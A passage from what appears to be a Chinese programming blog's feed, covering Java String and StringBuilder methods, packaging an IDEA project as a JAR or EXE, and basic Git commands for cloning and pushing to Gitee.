class="hljs-number">0</span>;i&lt;len;++i)&#123;<br>       System.out.println(s1[i]);<br>   &#125;<br></code></pre></div></td></tr></table></figure><blockquote><ol><li>需要加双斜线的：<code>+</code>、<code>*</code>、<code>$</code>、<code>^</code>、</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s = <span class="hljs-string">&quot;ab+cdef+gh&quot;</span>;<br>String[] s1 = s.split(<span class="hljs-string">&quot;\\+&quot;</span>); <br>String s = <span class="hljs-string">&quot;ab*cdef*gh&quot;</span>;<br>String[] s1 = s.split(<span class="hljs-string">&quot;\\*&quot;</span>); <br>String s = <span class="hljs-string">&quot;ab$cdef$gh&quot;</span>;<br>String[] s1 = s.split(<span class="hljs-string">&quot;\\$&quot;</span>); <br>String s = <span class="hljs-string">&quot;ab^cdef^gh&quot;</span>;<br>String[] s1 = s.split(<span class="hljs-string">&quot;\\^&quot;</span>); <br><span class="hljs-comment">//输出</span><br>ab<br>cdef<br>gh<br><br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>其他</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s = <span class="hljs-string">&quot;ab,cde,fgh&quot;</span>;<br>String[] s1 = s.split(<span class="hljs-string">&quot;,&quot;</span>);<br><span class="hljs-comment">//输出</span><br>ab<br>cde<br>fgh<br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>多个符号作为分隔符，使用多个分隔符则需要借助 <code>|</code> 符号</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s = <span class="hljs-string">&quot;ab,c+de@fgh&quot;</span>;<br>String[] s1 = s.split(<span class="hljs-string">&quot;,|\\+|@&quot;</span>); <span class="hljs-comment">//以逗号、加号、@为分隔符，之间用或（|）</span><br></code></pre></div></td></tr></table></figure><h3 id="3-7-拼接字符串"><a href="#3-7-拼接字符串" class="headerlink" title="3.7 拼接字符串"></a>3.7 拼接字符串</h3><p>拼接字符串使用静态方法<code>join()</code>，它用指定的字符串连接字符串数组。返回一个字符串。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s = <span class="hljs-string">&quot;ab,c+de@fgh&quot;</span>;<br>String[] s1 = s.split(<span class="hljs-string">&quot;,|\\+|@&quot;</span>);<br>System.out.println(s);<br><span class="hljs-keyword">int</span> len=s1.length;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;len;++i)&#123;<br>System.out.println(s1[i]);<br>&#125;<br>System.out.println(<span class="hljs-string">&quot;===============================&quot;</span>);<br>String s3 = String.join(<span class="hljs-string">&quot;****&quot;</span>,s1);<br>System.out.println(s3);<br><span class="hljs-comment">//输出</span><br>ab,c+de<span class="hljs-meta">@fgh</span><br>ab<br>c<br>de<br>fgh<br>===============================<br>ab****c****de****fgh<br></code></pre></div></td></tr></table></figure><h3 id="3-8-格式化字符串"><a href="#3-8-格式化字符串" class="headerlink" title="3.8 格式化字符串"></a>3.8 格式化字符串</h3><p>详见 <a href="https://tothefor.com/2021/07/27/%E6%AF%8F%E6%97%A5%E4%B8%80%E7%82%B9/%E6%AF%8F%E6%97%A5%E4%B8%80%E7%82%B9-JAVA%E4%BF%9D%E7%95%99%E5%B0%8F%E6%95%B0%E7%82%B9%E4%BD%8D%E6%95%B0/">《每日一点-JAVA保留小数点位数》</a></p><h3 id="3-9-类型转换"><a href="#3-9-类型转换" class="headerlink" title="3.9 类型转换"></a>3.9 类型转换</h3><blockquote><ol><li>其他类型转字符（String.valueOf()），返回一个字符串。</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span> a = <span class="hljs-number">2123</span>;<br>String resu = String.valueOf(a);<br>System.out.println(resu);<br><span class="hljs-keyword">boolean</span> flag = <span class="hljs-keyword">true</span>;<br>resu = String.valueOf(flag);<br>System.out.println(resu);<br><span class="hljs-keyword">double</span> f = <span class="hljs-number">23.4324</span>;<br>resu = String.valueOf(f);<br>System.out.println(resu);<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>字符串转其他类型</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//整数字符串转整数</span><br>String sint = <span class="hljs-string">&quot;123456&quot;</span>;<br><span class="hljs-keyword">int</span> resu = Integer.parseInt(sint);<br><span class="hljs-keyword">int</span> re = Integer.parseInt(sint,<span class="hljs-number">11</span>); <span class="hljs-comment">//194871 把字符串里的数字当成11进制数，再转换为10进制。</span><br>System.out.println(resu); <span class="hljs-comment">//123456</span><br>resu+=<span class="hljs-number">10</span>;<br>System.out.println(resu); <span class="hljs-comment">//123466</span><br><br><span class="hljs-comment">//boolean字符串转布尔值</span><br>String sbool = <span class="hljs-string">&quot;true&quot;</span>;<br><span class="hljs-keyword">boolean</span> fresu = Boolean.parseBoolean(sbool);<br>    <span class="hljs-keyword">if</span>(fresu) &#123;<br>        System.out.println(<span class="hljs-string">&quot;YES&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;NO&quot;</span>);<br>    &#125;<br><span class="hljs-comment">//YES</span><br><br><span class="hljs-comment">//浮点数字符串转浮点数</span><br>String sdouble = <span class="hljs-string">&quot;13.324&quot;</span>;<br><span class="hljs-keyword">double</span> resu2 = Double.parseDouble(sdouble);<br>System.out.println(resu2); <span class="hljs-comment">//13.324</span><br></code></pre></div></td></tr></table></figure><p><strong>要特别注意，Integer有个getInteger(String)方法，它不是将字符串转换为int，而是把该字符串对应的系统变量转换为Integer。例如：</strong></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Integer.getInteger(<span class="hljs-string">&quot;java.version&quot;</span>); <span class="hljs-comment">// 版本号，11</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>将整数格式化为指定进制的字符串</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"> System.out.println(Integer.toString(<span class="hljs-number">100</span>)); <span class="hljs-comment">// &quot;100&quot;,表示为10进制</span><br> System.out.println(Integer.toString(<span class="hljs-number">100</span>, <span class="hljs-number">36</span>)); <span class="hljs-comment">// &quot;2s&quot;,表示为36进制</span><br> System.out.println(Integer.toHexString(<span class="hljs-number">100</span>)); <span class="hljs-comment">// &quot;64&quot;,表示为16进制</span><br> System.out.println(Integer.toOctalString(<span class="hljs-number">100</span>)); <span class="hljs-comment">// &quot;144&quot;,表示为8进制</span><br> System.out.println(Integer.toBinaryString(<span class="hljs-number">100</span>)); <span class="hljs-comment">// &quot;1100100&quot;,表示为2进制</span><br><br><span class="hljs-comment">//或者</span><br>System.out.println(Integer.toString(<span class="hljs-number">100</span>, radix)); <span class="hljs-comment">// 将100转换为radix进制的字符串</span><br></code></pre></div></td></tr></table></figure><h3 id="3-10-字符串与char-相互转化"><a href="#3-10-字符串与char-相互转化" class="headerlink" title="3.10 字符串与char[]相互转化"></a>3.10 字符串与char[]相互转化</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">char</span>[] cs = <span class="hljs-string">&quot;Hello&quot;</span>.toCharArray(); <span class="hljs-comment">// String -&gt; char[]</span><br>String s = <span class="hljs-keyword">new</span> String(cs); <span class="hljs-comment">// char[] -&gt; String</span><br></code></pre></div></td></tr></table></figure><p>如果修改了char[]数组，String并不会改变。因为通过new String(char[])创建新的String实例时，它并不会直接引用传入的char[]数组，而是会复制一份，所以，修改外部的char[]数组不会影响String实例内部的char[]数组，因为这是两个不同的数组。</p><h2 id="4-StringBuilder"><a href="#4-StringBuilder" class="headerlink" title="4.StringBuilder"></a>4.StringBuilder</h2><p>StringBuilder 是一个可变的字符序列。它继承于AbstractStringBuilder，实现了CharSequence接口。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">StringBuilder strB = <span class="hljs-keyword">new</span> StringBuilder();<br><br><span class="hljs-comment">//1、append(String str)/append(Char c)：字符串连接</span><br>System.out.println(<span class="hljs-string">&quot;StringBuilder:&quot;</span>+strB.append(<span class="hljs-string">&quot;ch&quot;</span>).append(<span class="hljs-string">&quot;111&quot;</span>).append(<span class="hljs-string">&#x27;c&#x27;</span>));<br><span class="hljs-comment">//return &quot;StringBuilder:ch111c&quot;</span><br><br><span class="hljs-comment">//2、toString()：返回一个与构建起或缓冲器内容相同的字符串</span><br>System.out.println(<span class="hljs-string">&quot;String:&quot;</span>+strB.toString());<br><span class="hljs-comment">//return &quot;String:ch111c&quot;</span><br><br><span class="hljs-comment">//3、appendcodePoint(int cp)：追加一个代码点，并将其转换为一个或两个代码单元并返回this</span><br>System.out.println(<span class="hljs-string">&quot;StringBuilder.appendCodePoint:&quot;</span>+strB.appendCodePoint(<span class="hljs-number">2</span>));<br><span class="hljs-comment">//return &quot;StringBuilder.appendCodePoint:ch111c&quot;</span><br><br><span class="hljs-comment">//4、setCharAt(int i, char c)：将第 i 个代码单元设置为 c（可以理解为替换）</span><br>strB.setCharAt(<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;d&#x27;</span>);<br>System.out.println(<span class="hljs-string">&quot;StringBuilder.setCharAt:&quot;</span> + strB);<br><span class="hljs-comment">//return &quot;StringBuilder.setCharAt:chd11c&quot;</span><br><br><span class="hljs-comment">//5、insert(int offset, String str)/insert(int offset, Char c)：在指定位置之前插入字符(串)</span><br>System.out.println(<span class="hljs-string">&quot;StringBuilder.insertString:&quot;</span>+ strB.insert(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;LS&quot;</span>));<br><span class="hljs-comment">//return &quot;StringBuilder.insertString:chLSd11c&quot;</span><br>System.out.println(<span class="hljs-string">&quot;StringBuilder.insertChar:&quot;</span>+ strB.insert(<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;L&#x27;</span>));<br><span class="hljs-comment">//return &quot;StringBuilder.insertChar:chLLSd11c&quot;</span><br><br><span class="hljs-comment">//6、delete(int startIndex,int endIndex)：删除起始位置（含）到结尾位置（不含）之间的字符串</span><br>System.out.println(<span class="hljs-string">&quot;StringBuilder.delete:&quot;</span>+ strB.delete(<span class="hljs-number">2</span>, <span class="hljs-number">4</span>));<br><span class="hljs-comment">//return &quot;StringBuilder.delete:chSd11c&quot;</span><br></code></pre></div></td></tr></table></figure><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">StringBuilder sb = <span class="hljs-keyword">new</span> StringBuilder(<span class="hljs-string">&quot;tothefor&quot;</span>);<br>System.out.println(sb);<br>sb.append(<span class="hljs-string">&quot;.com&quot;</span>); <span class="hljs-comment">// append(String str)/append(Char c)</span><br>System.out.println(sb);<br>String mid = sb.toString(); <span class="hljs-comment">// toString()</span><br>System.out.println(mid);<br>sb.insert(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;www.&quot;</span>);<span class="hljs-comment">//insert(int offset, String str)/insert(int offset, Char c)</span><br>System.out.println(sb);<br>sb.delete(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>);<span class="hljs-comment">//delete(int startIndex,int endIndex) [startIndex,endIndex)</span><br>System.out.println(sb);<br>sb.setCharAt(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;w&#x27;</span>);<span class="hljs-comment">//setCharAt(int i, char c)</span><br>System.out.println(sb);<br><br>sb.appendCodePoint(<span class="hljs-number">65</span>); <span class="hljs-comment">//ASCII码65是大写的A</span><br>System.out.println(sb);<br><br><span class="hljs-comment">//输出</span><br>tothefor<br>tothefor.com<br>tothefor.com<br>twww.othefor.com<br>tothefor.com<br>twthefor.com<br>twthefor.comA<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>星星之火-IDEA-JAVA项目打包成JAR、EXE</title>
    <link href="/2021/07/31/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-IDEA-JAVA%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85%E6%88%90JAR%E3%80%81EXE/"/>
    <url>/2021/07/31/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-IDEA-JAVA%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85%E6%88%90JAR%E3%80%81EXE/</url>
    
    <content type="html"><![CDATA[<p>积土成山，风雨兴焉；积水成渊，蛟龙生焉；积善成德，而神明自得，圣心备焉。故不积跬步，无以至千里，不积小流无以成江海。齐骥一跃，不能十步，驽马十驾，功不在舍。面对悬崖峭壁，一百年也看不出一条裂缝来，但用斧凿，能进一寸进一寸，能进一尺进一尺，不断积累，飞跃必来，突破随之。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-打包成JAR"><a href="#1-打包成JAR" class="headerlink" title="1.打包成JAR"></a>1.打包成JAR</h2><blockquote><ol><li>File -&gt; Project Structure ….</li></ol></blockquote><blockquote><ol start="2"><li>如图。</li></ol></blockquote><p><img src="https://img-blog.csdnimg.cn/084a2db3af1d42f18d23facc219eac4e.png"></p><blockquote><ol start="3"><li>选择Main方法</li></ol></blockquote><p><img src="https://img-blog.csdnimg.cn/243c6772f7ca4aad954fd9d057c8a6a7.png"></p><p><img src="https://img-blog.csdnimg.cn/0b38f1c3420140c7aec87762ddc0a4db.png"></p><p>然后点击apply ok 即可。</p><blockquote><ol start="4"><li>在IDEA中找到Build，随后选择Build Artfacts。在弹出的小窗口中选择要打包的，再build即可。</li></ol></blockquote><p><img src="https://img-blog.csdnimg.cn/8aa4ab13fab84a03a3c5a7a44d1bd14e.png"></p><p>最后在项目里面的out文件夹中，有打包好的jar文件后，打包工作就完成了。</p><h2 id="2-打包成EXE"><a href="#2-打包成EXE" class="headerlink" title="2.打包成EXE"></a>2.打包成EXE</h2><p>其实双击jar包和exe没有什么区别。可以利用工具 <code>exe4j</code>将jar包转换成exe。</p><p>有时间待更新具体操作······</p>]]></content>
    
    
    <categories>
      
      <category>星星之火</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
      <tag>IDEA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>星星之火-Git的简单快速使用</title>
    <link href="/2021/07/30/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-Git%E7%9A%84%E7%AE%80%E5%8D%95%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8/"/>
    <url>/2021/07/30/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-Git%E7%9A%84%E7%AE%80%E5%8D%95%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>积土成山，风雨兴焉；积水成渊，蛟龙生焉；积善成德，而神明自得，圣心备焉。故不积跬步，无以至千里，不积小流无以成江海。齐骥一跃，不能十步，驽马十驾，功不在舍。面对悬崖峭壁，一百年也看不出一条裂缝来，但用斧凿，能进一寸进一寸，能进一尺进一尺，不断积累，飞跃必来，突破随之。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-配置Git"><a href="#1-配置Git" class="headerlink" title="1.配置Git"></a>1.配置Git</h2><p>需要先下载Git和在本电脑上配置好Git。详情见 <a href="https://tothefor.com/2021/06/03/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">Git学习笔记</a></p><p>其次是在Gitee上配置好公钥。</p><h2 id="2-IDEA使用Git插件"><a href="#2-IDEA使用Git插件" class="headerlink" title="2.IDEA使用Git插件"></a>2.IDEA使用Git插件</h2><ul><li><p>在IDEA插件中搜索Gitee，并安装。</p></li><li><p>在 Preferences -&gt; Version Control 下，选中 Gitee，添加一个账号，登录Gitee账号，需要使用邮箱和密码。在提交时，填上仓库的地址即可。</p></li></ul><p><img src="https://img-blog.csdnimg.cn/f150c76ad2ac4963bf7d8fb05b50ef65.png"></p><p><strong>若要传一个新项目，则必须要先在当前文件夹中初始化（git init），否则在IDEA中没有git相关的提交按钮。</strong></p><h2 id="3-在新文件夹中拉取"><a href="#3-在新文件夹中拉取" class="headerlink" title="3.在新文件夹中拉取"></a>3.在新文件夹中拉取</h2><p>用IDEA打开空文件夹，在<code>VCS</code>中选择<code>Get from Version Control</code>。</p><h2 id="4-用自己的仓库（命令窗口）"><a href="#4-用自己的仓库（命令窗口）" class="headerlink" title="4.用自己的仓库（命令窗口）"></a>4.用自己的仓库（命令窗口）</h2><p>前提需要把本地的Git配置配置好。</p><h3 id="直接克隆"><a href="#直接克隆" class="headerlink" title="直接克隆"></a>直接克隆</h3><p>在远程仓库中有一些文件。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 在相应文件夹中克隆</span><br>git <span class="hljs-built_in">clone</span> https://gitee.com/dragonone713/learn-git.git <span class="hljs-comment"># 后面的仓库地址需要换成自己已经有的</span><br><span class="hljs-comment"># 2. 再进入克隆下来的文件夹</span><br><span class="hljs-comment"># 3. 添加文件</span><br>touch test.html<br><span class="hljs-comment"># 4. 执行添加命令，将新增文件添加到暂存区</span><br>git add test.html<br><span class="hljs-comment"># 5. 提交到本地仓库</span><br>git commit -m <span class="hljs-string">&quot;提示语&quot;</span>  <br><span class="hljs-comment"># 理论上，执行完这句后，按理来说就可以执行 git push ，一样可以上传到仓库。但为了规范，继续依次执行。</span><br><span class="hljs-comment"># 6. </span><br>git remote add origin git@gitee.com:dragonone713/learn-git.git <span class="hljs-comment"># 注意自己换地址</span><br><span class="hljs-comment"># 7. 提交到远程仓库</span><br>git push -u origin master <span class="hljs-comment"># 除了第一次，后面可以不再需要 -u 参数</span><br></code></pre></div></td></tr></table></figure><h3 id="在本地上传项目"><a href="#在本地上传项目" class="headerlink" title="在本地上传项目"></a>在本地上传项目</h3><p>需要先建一个空的远程仓库。然后依次执行一下命令即可。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">mkdir qwer<br><span class="hljs-built_in">cd</span> qwer<br>git init<br>touch README.md<br>git add README.md<br>git commit -m <span class="hljs-string">&quot;first commit&quot;</span><br>git remote add origin git@gitee.com:dragonone713/qwer.git  <span class="hljs-comment"># 注意换成自己的仓库地址</span><br>git push -u origin master<br></code></pre></div></td></tr></table></figure><h3 id="GitHub应该是同样的道理，就不再叙述。"><a href="#GitHub应该是同样的道理，就不再叙述。" class="headerlink" title="GitHub应该是同样的道理，就不再叙述。"></a>GitHub应该是同样的道理，就不再叙述。</h3><h2 id="5-Git常用命令"><a href="#5-Git常用命令" class="headerlink" title="5.Git常用命令"></a>5.Git常用命令</h2><h3 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 在当前目录新建一个Git代码库</span><br>$ git init<br><br><span class="hljs-comment"># 新建一个目录，将其初始化为Git代码库</span><br>$ git init [project-name]<br><br><span class="hljs-comment"># 下载一个项目和它的整个代码历史</span><br>$ git <span class="hljs-built_in">clone</span> [url]<br></code></pre></div></td></tr></table></figure><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 显示当前的Git配置</span><br>$ git config --list<br><br><span class="hljs-comment"># 编辑Git配置文件</span><br>$ git config -e [--global]<br><br><span class="hljs-comment"># 设置提交代码时的用户信息</span><br>$ git config [--global] user.name <span class="hljs-string">&quot;[name]&quot;</span><br>$ git config [--global] user.email <span class="hljs-string">&quot;[email address]&quot;</span><br></code></pre></div></td></tr></table></figure><h3 id="增-删文件"><a href="#增-删文件" class="headerlink" title="增/删文件"></a>增/删文件</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 添加指定文件到暂存区</span><br>$ git add [file1] [file2] ...<br><br><span class="hljs-comment"># 添加指定目录到暂存区，包括子目录</span><br>$ git add [dir]<br><br><span class="hljs-comment"># 添加当前目录的所有文件到暂存区</span><br>$ git add .<br><br><span class="hljs-comment"># 添加每个变化前，都会要求确认</span><br><span class="hljs-comment"># 对于同一个文件的多处变化，可以实现分次提交</span><br>$ git add -p<br><br><span class="hljs-comment"># 删除工作区文件，并且将这次删除放入暂存区</span><br>$ git rm [file1] [file2] ...<br><br><span class="hljs-comment"># 停止追踪指定文件，但该文件会保留在工作区</span><br>$ git rm --cached [file]<br><br><span class="hljs-comment"># 改名文件，并且将这个改名放入暂存区</span><br>$ git mv [file-original] [file-renamed]<br></code></pre></div></td></tr></table></figure><h3 id="代码提交"><a href="#代码提交" class="headerlink" title="代码提交"></a>代码提交</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 提交暂存区到仓库区</span><br>$ git commit -m [message]<br><br><span class="hljs-comment"># 提交暂存区的指定文件到仓库区</span><br>$ git commit [file1] [file2] ... -m [message]<br><br><span class="hljs-comment"># 提交工作区自上次commit之后的变化，直接到仓库区</span><br>$ git commit -a<br><br><span class="hljs-comment"># 提交时显示所有diff信息</span><br>$ git commit -v<br><br><span class="hljs-comment"># 使用一次新的commit，替代上一次提交</span><br><span class="hljs-comment"># 如果代码没有任何新变化，则用来改写上一次commit的提交信息</span><br>$ git commit --amend -m [message]<br><br><span class="hljs-comment"># 重做上一次commit，并包括指定文件的新变化</span><br>$ git commit --amend [file1] [file2] ...<br></code></pre></div></td></tr></table></figure><h3 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 列出所有本地分支</span><br>$ git branch<br><br><span class="hljs-comment"># 列出所有远程分支</span><br>$ git branch -r<br><br><span class="hljs-comment"># 列出所有本地分支和远程分支</span><br>$ git branch -a<br><br><span class="hljs-comment"># 新建一个分支，但依然停留在当前分支</span><br>$ git branch [branch-name]<br><br><span class="hljs-comment"># 新建一个分支，并切换到该分支</span><br>$ git checkout -b 